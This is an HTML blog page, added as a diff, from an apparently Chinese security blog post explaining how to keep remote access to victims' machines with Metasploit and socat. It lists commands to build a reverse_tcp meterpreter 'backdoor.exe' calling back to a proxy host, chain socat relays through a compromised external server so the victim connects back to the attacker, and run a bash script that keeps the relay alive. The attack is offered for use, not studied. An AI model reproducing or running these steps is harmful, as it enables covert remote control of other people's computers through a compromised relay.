@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="还在纠结别人的远控不敢用，自己又不会写的尴尬吗？还在为身处内网为每月vps费用心疼吗？来吧祭出msf+socat，完美解决你的问题。"/>
+
+
+
+
+  <meta name="keywords" content="socat,proxy,meterpreter" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/03/socat-meterpreter实现维持访问/"/>
+
+
+<meta name="description" content="还在纠结别人的远控不敢用，自己又不会写的尴尬吗？还在为身处内网为每月vps费用心疼吗？来吧祭出msf+socat，完美解决你的问题。">
+<meta name="keywords" content="socat,proxy,meterpreter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="socat+meterpreter实现维持访问">
+<meta property="og:url" content="http://yoursite.com/2017/03/socat-meterpreter实现维持访问/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="还在纠结别人的远控不敢用，自己又不会写的尴尬吗？还在为身处内网为每月vps费用心疼吗？来吧祭出msf+socat，完美解决你的问题。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/03/23/58d36ab8a0fce.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/03/23/58d36db8dd946.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/03/23/58d3741a3c712.png">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="socat+meterpreter实现维持访问">
+<meta name="twitter:description" content="还在纠结别人的远控不敢用，自己又不会写的尴尬吗？还在为身处内网为每月vps费用心疼吗？来吧祭出msf+socat，完美解决你的问题。">
+<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/03/23/58d36ab8a0fce.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> socat+meterpreter实现维持访问 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          socat+meterpreter实现维持访问
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 14 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="meterpreter介绍"><a href="#meterpreter介绍" class="headerlink" title="meterpreter介绍"></a>meterpreter介绍</h2><p>不管是大牛还是小菜metasploit都是一款神器，这个就不多说了，本文主要介绍meterpreter的反弹和维持访问。搭建虚拟环境，测试<code>payload=windows/meterpreter/reverse_tcp</code>来反弹shell相信大家也都会玩，这里不加介绍。当把虚拟机换在公网这个复杂的环境下时问题就出现了，服务端往往在内网，而我们msf的客户端也在内网，这时候打通内网间的通道是一道必不可少的程序了。</p>
+<h2 id="socat介绍"><a href="#socat介绍" class="headerlink" title="socat介绍"></a>socat介绍</h2><p>参考<a href="http://www.dest-unreach.org/socat/" target="_blank" rel="external">http://www.dest-unreach.org/socat/</a><br>中转命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">proxy ：socat tcp-listen:port1 tcp-listen:port2</div><div class="line">server：socat tcp:outhost:port1 TCP:serverhost:port3</div></pre></td></tr></table></figure></p>
+<p>此时client连接内网server的port3，只需要连接外网proxy的port2即可。<br>比如常用的内网client连接内网ip为192.168.1.1的server3389端口，proxy为外网服务器xx.xx.xx.xx只需要：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">proxy ：socat tcp-listen:1234 tcp-listen:6789</div><div class="line">server：socat tcp:xx.xx.xx.xx:1234 TCP:192.168.1.1:3389</div></pre></td></tr></table></figure></p>
+<p>此时client只需要<code>mstsc xx.xx.xx.xx:1234</code>即可。<br><img src="https://ooo.0o0.ooo/2017/03/23/58d36ab8a0fce.png" alt="QQ20170323-142619@2x.png"></p>
+<h2 id="socat-meterpreter"><a href="#socat-meterpreter" class="headerlink" title="socat+meterpreter"></a>socat+meterpreter</h2><p>其实只要明白了socat中转的原理，内网反弹内网就很简单了。<br>在上一段中我们是内网主动去连内网的。现在想要用metasploit的<code>meterpreter/reverse_tcp</code>这个模块来反弹上线，那么原理应该是这样的。<br><img src="https://ooo.0o0.ooo/2017/03/23/58d36db8dd946.png" alt="QQ20170323-143932@2x.png"><br>换成命令操作应该是：</p>
+<blockquote>
+<p>1、Attacker: <code>msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=5678 -f exe -o backdoor.exe</code>；</p>
+<p>2、Attacker: <code>exp handler;lhost=172.16.1.1 lport=4444</code> 进行监听，此处msf的命令比较简单，太麻烦就不写太多了；</p>
+<p>3、Proxy   : <code>socat tcp-listen:1234 tcp-listen:5678</code> 用来中转流量，受害者执行木马到proxy的5678，将流量转发到1234端口；</p>
+<p>4、Attacker: <code>socat tcp:xx.xx.xx.xx:1234 tcp:172.16.1.1:4444</code> 本地4444与proxy的1234建立双向连接；</p>
+<p>5、Victim  : <code>exec backdoor.exe</code></p>
+</blockquote>
+<p>1-4步建立了整个过程的连接，当victim执行backdoor后，反向链接到proxy的5678，proxy将5678接受到的流量中转到1234端口，在此之前Attacker的4444与Proxy的1234已经建立了双向通道，因此此时1234端口的流量到达Attacker的4444上能够被metasploit的handler接收到。此时一个完整的通道打通，Victim成功上线。<br><img src="https://ooo.0o0.ooo/2017/03/23/58d3741a3c712.png" alt="QQ20170323-150640@2x.png"><br>上图是在本地内网运行msf监听，另一个网段的虚拟机中执行backdoor，通过外网proxy成功建立会话。</p>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>遇到一个最大的问题至今没弄明白，就是socat为什么建立连接之后只要会话完成，或者主动中断，proxy上运行的<code>socat tcp-listen:port1 tcp-listen:port2</code>也会断。也就是说下次想要建立连接，还需要在proxy上再运行一遍<code>socat tcp-listen:port1 tcp-listen:port2</code>，这个问题一直弄不懂原因是什么。考虑到常用的利用场景是拿下一台外网服务器做proxy，尽量少的在proxy上做动作，只需要每时每刻进行中转两个端口的流量即可。因此不可能每次都要远程到proxy上执行中转命令。因此直接撸个脚本放那算了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">while</span> :</div><div class="line"><span class="keyword">do</span></div><div class="line">    pid=`ps -ef|grep socat|grep listen|awk <span class="string">'&#123;print $2&#125;'</span>`</div><div class="line">    sleep 10</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$pid</span>"</span> ];</div><div class="line">        <span class="keyword">then</span></div><div class="line">            socat tcp-listen:5354 tcp-listen:5353 &amp;</div><div class="line">        <span class="keyword">fi</span></div><div class="line">    &#125;||&#123;</div><div class="line">        <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$pid</span>"</span> ]</div><div class="line">        <span class="keyword">then</span></div><div class="line">            <span class="built_in">kill</span> -9 <span class="string">"<span class="variable">$pid</span>"</span></div><div class="line">            sleep 5</div><div class="line">            socat tcp-listen:5354 tcp-listen:5353 &amp;</div><div class="line">        <span class="keyword">fi</span></div><div class="line">    &#125;</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<p>脚本的目的是每隔10s检测socat是否中断，如果断了执行一下命令。但是有时候进程还在，端口也在开着，但是不进行中转，再次执行命令会触发异常，因此直接kill掉进程重开一下。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>socat作为nc的加强版命令简单、功能强大。但是安装麻烦，需要make和gcc进行编译，没有nc轻量。在windows上试了下不成功，在linux上一般不会出错。<br>另外一款类似的工具cryptcat支持加密，之后可以试试。</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/Hexo/">Hexo</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/03/XSS-Payload整理/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">XSS Payload整理</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/03/zoomeye批量采集struts漏洞url/">
+        <span class="next-text nav-default">zoomeye采集struts url</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
